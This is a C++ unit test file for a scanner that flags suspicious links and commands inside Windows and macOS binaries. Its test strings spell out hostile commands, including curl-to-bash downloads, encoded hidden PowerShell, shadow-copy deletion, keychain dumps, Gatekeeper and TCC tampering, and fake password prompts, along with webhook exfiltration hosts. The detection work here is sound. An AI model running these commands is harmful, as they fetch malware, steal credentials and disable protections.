// str_scan_tests.cpp -- native unit tests for core/str_scan.h (no Windows needed): links, commands (Windows and macOS), limits, Mach-O sniffing.
//
//   g++ -std=c++17 -O1 -g -Wall -I core tests/str_scan_tests.cpp -o str_scan_tests && ./str_scan_tests
//   g++ ... -fsanitize=address,undefined ...                                           (memory / UB)
#include "str_scan.h"
#include <cstdio>
#include <cstdlib>

static int g_fail=0, g_checks=0;
#define CHECK(c) do{ g_checks++; if(!(c)){ g_fail++; printf("  FAIL %s:%d  %s\n",__FILE__,__LINE__,#c); } }while(0)

typedef std::vector<uint8_t> Bytes;
static Bytes ascii(const std::string& s,bool nul=true){ Bytes b(s.begin(),s.end()); if(nul) b.push_back(0); return b; }
static Bytes wide(const std::string& s){ Bytes b; for(char c:s){ b.push_back((uint8_t)c); b.push_back(0); } b.push_back(0); b.push_back(0); return b; }
static Bytes cat(std::initializer_list<Bytes> parts){ Bytes o; for(auto& p:parts) o.insert(o.end(),p.begin(),p.end()); return o; }
static Bytes noise(size_t n,unsigned seed){ Bytes b(n); for(auto& x:b){ seed=seed*1103515245u+12345u; x=(uint8_t)(seed>>16); } return b; }
static StrReport run(const Bytes& b){ return strscan::scan(b.data(),b.size()); }
static StrReport runS(const std::string& s){ return run(ascii(s)); }
static bool hasText(const StrReport& r,const std::string& t,bool command=false){ for(auto& f:r.shown) if(f.text==t&&f.command==command) return true; return false; }

static void testLinks(){
  printf("[links]\n");
  { StrReport r=run(cat({noise(300,1),ascii("http://evil.example.com/payload.exe"),noise(300,2)}));
    CHECK(hasText(r,"http://evil.example.com/payload.exe")); CHECK(r.links>=1&&r.commands==0); }
  { StrReport r=run(cat({noise(64,3),wide("https://cdn.discordapp.com/attachments/1/2/x.exe"),noise(64,4)}));            // UTF-16LE
    CHECK(hasText(r,"https://cdn.discordapp.com/attachments/1/2/x.exe")); CHECK(r.shown[0].hot); }
  { Bytes odd=cat({ascii("X",false),wide("http://odd.example.net/z")});                                                   // wide string at an odd offset
    CHECK(hasText(run(odd),"http://odd.example.net/z")); }
  { StrReport r=runS("HTTP://EXAMPLE.COM/A"); CHECK(hasText(r,"HTTP://EXAMPLE.COM/A")); }                              // case kept
  { StrReport r=runS("see http://example.com/a.exe."); CHECK(hasText(r,"http://example.com/a.exe")); }                  // sentence dot cut off
  { StrReport r=runS("<a href='http://example.com/y'>x</a>"); CHECK(hasText(r,"http://example.com/y")); }
  { StrReport r=runS("\"http://example.com/x\""); CHECK(hasText(r,"http://example.com/x")); }
  { StrReport r=runS("http://a.example.com/1 http://b.example.com/2"); CHECK(r.links==2); }
  { StrReport r=runS("ftp://files.example.org/x.zip"); CHECK(r.links==1); }
  { StrReport r=runS("wss://c2.example.org:8443/ws"); CHECK(r.links==1); }
  // things that look like links and are not
  CHECK(runS("http://%s:%d/api").links==0);
  CHECK(runS("https://").links==0);
  CHECK(runS("http://localhost:8080/x").links==0);
  CHECK(runS("http://127.0.0.1/x").links==0);
  CHECK(runS("http://schemas.microsoft.com/winfx/2006/xaml").links==0);
  CHECK(runS("http://www.w3.org/2000/svg").links==0);
  CHECK(runS("http://crl.microsoft.com/pki/crl/products/x.crl").links==0);
  CHECK(runS("http://syncrl.example.com/x").links==1);                                                                 // "crl." inside a longer host name is not a certificate host
  CHECK(runS("ab://").links==0);
  // the same link three times is one finding
  { StrReport r=run(cat({ascii("http://dup.example.com/a"),noise(20,5),ascii("http://dup.example.com/a"),ascii("http://dup.example.com/a")})); CHECK(r.links==1); }
  // very long link: cut, still marked
  { StrReport r=runS("http://long.example.com/"+std::string(300,'a')); CHECK(r.shown.size()==1&&r.shown[0].text.size()==strscan::MAX_TEXT&&r.shown[0].text.substr(157)=="..."); }
}

static void testHot(){
  printf("[hot links]\n");
  { StrReport r=run(cat({ascii("http://aaa.example.org/x"),ascii("https://discord.com/api/webhooks/123/abc")}));
    CHECK(r.shown.size()==2&&r.shown[0].hot&&r.shown[0].text.find("webhooks")!=std::string::npos&&!r.shown[1].hot); }       // hot first
  CHECK(runS("https://pastebin.com/raw/abc123").shown[0].hot);
  CHECK(runS("https://api.telegram.org/bot123:abc/sendMessage").shown[0].hot);
  CHECK(runS("https://raw.githubusercontent.com/u/r/main/x.ps1").shown[0].hot);
  CHECK(!runS("https://example.org/x").shown[0].hot);
  CHECK(!runS("http://best.me/x").shown[0].hot);                                                                          // "t.me/" inside "best.me/" is not t.me
  CHECK(!runS("http://orbit.ly/x").shown[0].hot);
}

static void testIpPort(){
  printf("[ip:port]\n");
  CHECK(hasText(runS("connect 185.199.108.153:4444 now"),"185.199.108.153:4444"));
  CHECK(runS("10.0.0.1 is the gateway").links==0);                                                                         // no port: a version, a note
  CHECK(runS("999.1.1.1:80").links==0);
  CHECK(runS("1.2.3.4:99999").links==0);
  CHECK(runS("1.2.3.4:0").links==0);
  CHECK(runS("127.0.0.1:8080").links==0);
  CHECK(runS("0.0.0.0:80").links==0);
  CHECK(runS("1.2.3.4.5:80").links==0);                                                                                    // part of a longer dotted number
  CHECK(runS("version 6.1.7601.17514").links==0);
  CHECK(hasText(runS("http://203.0.113.9:8080/a"),"http://203.0.113.9:8080/a"));                                           // inside a URL: the URL
  { StrReport r=runS("203.0.113.9:8080 and 198.51.100.7:31337"); CHECK(r.links==2); }
}

static void testCommands(){
  printf("[commands]\n");
  CHECK(hasText(runS("powershell -nop -w hidden -enc JABzAD0ATgBlAHcA"),"powershell -nop -w hidden -enc JABzAD0ATgBlAHcA",true));
  CHECK(hasText(runS("PowerShell.exe -ExecutionPolicy Bypass -File x.ps1"),"PowerShell.exe -ExecutionPolicy Bypass -File x.ps1",true));
  { StrReport r=runS("certutil -urlcache -f http://x.example.org/a.exe a.exe"); CHECK(r.commands==1&&r.links==1); }          // the command AND its link
  CHECK(runS("schtasks /create /tn upd /tr c:\\x.exe").commands==1);
  CHECK(runS("vssadmin delete shadows /all /quiet").commands==1);
  CHECK(runS("bcdedit /set {default} recoveryenabled no").commands==1);
  CHECK(runS("Add-MpPreference -ExclusionPath C:\\Users").commands==1);
  CHECK(runS("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x").commands==1);
  CHECK(run(wide("mshta http://x.example.org/a.hta")).commands==1);                                                      // UTF-16 too
  // not commands
  CHECK(runS("powershell").commands==0);
  CHECK(runS("cmd /c dir").commands==0);
  CHECK(runS("hello world, this is a perfectly normal string").shown.empty());
  CHECK(runS("certutil").commands==0);
}

static void testShape(){
  printf("[runs, limits]\n");
  CHECK(strscan::scan(nullptr,0).shown.empty());
  { uint8_t one=0x41; CHECK(strscan::scan(&one,1).shown.empty()); }
  CHECK(run(ascii("http")).links==0);                                                                                      // shorter than a link
  CHECK(runS(std::string(5000,'A')).shown.empty());                                                                        // one huge run: split, no loop
  // a run is handed over in pieces of MAX_RUN: a link at the start of a huge run is still found
  CHECK(runS("http://start.example.com/p "+std::string(2000,'B')).links==1);
  { std::string many; for(int i=0;i<100;i++) many+="http://h"+std::to_string(i)+".example.com/x\n";                      // 100 links, one command
    Bytes b=cat({ascii(many),ascii("schtasks /create /tn x")});
    StrReport r=run(b); CHECK(r.links==100&&r.commands==1&&r.shown.size()==strscan::MAX_LINKS+1);
    bool cmd=false; for(auto& f:r.shown) cmd|=f.command; CHECK(cmd); }                                                      // the command is not pushed out by the links
  { std::string huge; for(int i=0;i<3000;i++) huge+="http://h"+std::to_string(i)+".example.com/\n"; Bytes b=ascii(huge);
    StrReport r=run(b); CHECK(r.links<=(int)strscan::MAX_CANDIDATES&&r.links>1000); }                                       // capped, not unbounded
  { Bytes b=noise(1u<<20,7); StrReport r=run(b); CHECK(r.links<20&&r.commands==0); }                                       // random bytes: no crash, next to nothing
  { Bytes b(1<<16,0); StrReport r=run(b); CHECK(r.shown.empty()); }                                                       // all zero
}

static void testMac(){
  printf("[macOS]\n");
  // the commands a Mac stealer / dropper is known for
  CHECK(hasText(runS("osascript -e 'display dialog \"Password:\" with hidden answer'"),"osascript -e 'display dialog \"Password:\" with hidden answer'",true));
  CHECK(runS("osascript -e 'do shell script \"id\" with administrator privileges'").commands==1);
  CHECK(runS("osascript -e 'do shell script \"touch /tmp/x\"'").commands==1);
  { StrReport r=runS("curl -fsSL http://x.example.org/i.sh | bash"); CHECK(r.commands==1&&r.links==1); }                  // the command AND its link
  CHECK(runS("curl -s http://x.example.org/i.sh | sh").commands==1);
  CHECK(runS("curl -s http://x.example.org/i.sh | zsh").commands==1);
  CHECK(runS("/bin/bash -c \"$(curl -fsSL http://x.example.org/i.sh)\"").commands==1);
  CHECK(runS("echo QUJDREVGRw== | base64 -D | bash").commands==1);
  CHECK(runS("echo QUJDREVGRw== | base64 --decode | zsh").commands==1);
  CHECK(runS("security find-generic-password -ga Chrome").commands==1);
  CHECK(runS("security find-internet-password -s example.org").commands==1);
  CHECK(runS("security dump-keychain -d login.keychain").commands==1);
  CHECK(runS("xattr -d com.apple.quarantine /tmp/x").commands==1);
  CHECK(runS("xattr -cr /Applications/Thing.app").commands==1);
  CHECK(runS("spctl --master-disable").commands==1);
  CHECK(runS("sqlite3 TCC.db \"INSERT INTO access VALUES(1)\"").commands==1);
  CHECK(runS("launchctl load -w ~/Library/LaunchAgents/com.example.x.plist").commands==1);
  CHECK(runS("launchctl bootstrap gui/501 x.plist").commands==1);
  CHECK(run(wide("osascript -e 'tell app \"System Events\" to display dialog \"x\" with hidden answer'")).commands==1);   // UTF-16 too
  // not commands
  CHECK(runS("osascript").commands==0);
  CHECK(runS("osascript -e 'tell application \"Finder\" to activate'").commands==0);
  CHECK(runS("curl -s http://x.example.org/a.json | jq .").commands==0);
  CHECK(runS("security").commands==0);
  CHECK(runS("launchctl list").commands==0);
  CHECK(runS("xattr -l file").commands==0);
  CHECK(runS("base64 -d in.txt").commands==0);
  CHECK(runS("echo hi | bash").commands==0);                                                                               // no download, no decoding
  // what every signed Mac program carries is not a finding; a link to Apple's developer site is still a link
  CHECK(runS("http://www.apple.com/DTDs/PropertyList-1.0.dtd").links==0);
  CHECK(runS("https://www.apple.com/appleca/").links==0);
  CHECK(runS("https://www.apple.com/certificateauthority/").links==0);
  CHECK(runS("http://ocsp.apple.com/ocsp03-wwdr01").links==0);
  CHECK(runS("http://crl.apple.com/root.crl").links==0);
  CHECK(runS("https://developer.apple.com/documentation/x").links==1);
  // a Mach-O shaped buffer: header, load-command names, then the strings
  { Bytes macho={0xCF,0xFA,0xED,0xFE,0x0C,0x00,0x00,0x01}; macho.resize(64,0);
    Bytes b=cat({macho,ascii("__TEXT"),ascii("__cstring"),ascii("https://discord.com/api/webhooks/1/abc"),noise(128,9),ascii("osascript -e 'x' with hidden answer")});
    StrReport r=run(b); CHECK(r.links==1&&r.commands==1&&r.shown[0].hot); }
}

static void testMacProgram(){
  printf("[Mach-O / script sniffing]\n");
  const uint8_t thin64[]={0xCF,0xFA,0xED,0xFE,0x0C,0,0,1};   // little-endian arm64 / x86_64 Mach-O
  const uint8_t thin32[]={0xCE,0xFA,0xED,0xFE,7,0,0,0};
  const uint8_t big64[] ={0xFE,0xED,0xFA,0xCF,0,0,0,0};      // byte-swapped
  const uint8_t fat2[]  ={0xCA,0xFE,0xBA,0xBE,0,0,0,2};      // universal, 2 architectures
  const uint8_t fat64[] ={0xCA,0xFE,0xBA,0xBF,0,0,0,2};
  const uint8_t klass[] ={0xCA,0xFE,0xBA,0xBE,0,0,0,0x34};   // a Java class file (version 52)
  const uint8_t fat0[]  ={0xCA,0xFE,0xBA,0xBE,0,0,0,0};
  const uint8_t shebang[]={'#','!','/','b','i','n','/','s','h'};
  const uint8_t pe[]    ={'M','Z',0x90,0,3,0,0,0};
  const uint8_t text[]  ={'h','e','l','l','o',' ','w','o'};
  CHECK(strscan::isMacProgram(thin64,8)); CHECK(strscan::isMacProgram(thin32,8)); CHECK(strscan::isMacProgram(big64,8));
  CHECK(strscan::isMacProgram(fat2,8)); CHECK(strscan::isMacProgram(fat64,8));
  CHECK(!strscan::isMacProgram(klass,8)); CHECK(!strscan::isMacProgram(fat0,8)); CHECK(!strscan::isMacProgram(fat2,7));
  CHECK(strscan::isMacProgram(shebang,9)); CHECK(strscan::isMacProgram(shebang,2));
  CHECK(!strscan::isMacProgram(pe,8)); CHECK(!strscan::isMacProgram(text,8));
  CHECK(!strscan::isMacProgram(thin64,3)); CHECK(!strscan::isMacProgram(shebang,1)); CHECK(!strscan::isMacProgram(nullptr,0));
}

int main(){
  testLinks(); testHot(); testIpPort(); testCommands(); testShape(); testMac(); testMacProgram();
  printf("\n%d checks, %d failed\n",g_checks,g_fail);
  return g_fail?1:0;
}
